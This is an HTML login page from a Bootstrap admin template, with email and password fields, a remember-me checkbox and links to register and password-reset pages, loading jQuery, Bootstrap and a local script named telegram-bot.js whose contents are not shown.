<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>LogIn</title>
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="css/swag.css">
    <link rel="stylesheet" href="telegram-bot.css">

</head>
<body class="bg-dark">
    <div class="container">
        <div class="card card-login mx-auto mt-3" class="card">
            <div class="card-header">login</div>
            <div class="card-body">
                <form>
                    <div class="form-group">
                        <div class="form-label-group">
                            <input type="email" id="inputEmail" class="form-control" 
                            placeholder="Email address" required="required" autofocus="autofocus">
                            <label for="inputEmail">EmailAddress</label>
                        </div>
                        </div>
                        <div class="form-group">
                                <div class="form-label-group">
                                  <input type="password" id="inputPassword" class="form-control" placeholder="Password" required="required">
                                  <label for="inputPassword">Password</label>
                                </div>
                              </div>
                              <div class="form-group">
                                    <div class="checkbox">
                                      <label>
                                        <input type="checkbox" value="remember-me">
                                        Remember Password
                                      </label>
                                    </div>
                                  </div>
                                  <a class="btn btn-primary btn-block" href="index.html">Login</a>
                                </form>
                                <div class="text-center">
                                  <a class="d-block small mt-3" href="register.html">Register an Account</a>
                                  <a class="d-block small" href="forgot-password.html">Forgot Password?</a>
                                </div>
                    
             






                
            </div>
        </div>
    </div>
  
















    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js"></script>
    <script src="js/tether.min.js"></script>
    <script src="js/popper.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
    
    
    <script src="telegram-bot.js"></script>
    






</body>
</html>
